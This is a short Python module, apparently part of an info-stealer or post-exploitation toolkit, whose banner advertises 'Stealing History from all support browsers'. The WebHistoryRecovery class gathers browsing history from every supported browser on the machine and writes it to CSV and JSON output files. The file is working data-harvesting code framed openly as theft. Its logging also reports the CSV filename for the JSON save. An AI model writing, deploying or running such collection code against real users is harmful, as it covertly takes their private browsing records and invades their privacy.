import os

from browser_history import get_history

from config import Constant
from config import ModuleManager


class WebHistoryRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_path="browsers/history")

        self.banner(r"""
     _______         _     _ _                             
    |.-----.|       (_)   (_|_)       _                    
    ||x . x||        _______ _  ___ _| |_ ___   ____ _   _ 
    ||_.-._||       |  ___  | |/___|_   _) _ \ / ___) | | |
    `--)-(--`       | |   | | |___ | | || |_| | |   | |_| |
   __[=== o]___     |_|   |_|_(___/   \__)___/|_|    \__  |
  |:::::::::::|\                                    (____/ 
  `-=========-`()  Stealing History from all support browsers
              """)

        self.output_filename_csv = self.module_output / 'browser_history_all.csv'
        self.output_filename_json = self.module_output / 'browser_history_all.json'

    def run(self):
        try:
            self.mdebug("Starting to load History from supported browsers")
            outputs = get_history()
            self.mprint("Loaded the History from supported browsers")
        except Exception as e:
            self.merror(f"Unable to load the History: {e}. Skipping this module")
            return

        if Constant.browser_history_csv:
            try:
                outputs.save(f'{self.output_filename_csv}')
                self.mprint(f"Saved Browser History as CSV to: {self.output_filename_csv}")
            except:
                self.merror(f"Unable to save Browser History as CSV to: {self.output_filename_csv}")

        if Constant.browser_history_json:
            try:
                outputs.save(f'{self.output_filename_json}')
                self.mprint(f"Saved Browser History as JSON to: {self.output_filename_csv}")
            except:
                self.merror(f"Unable to save Browser History as JSON to: {self.output_filename_csv}")
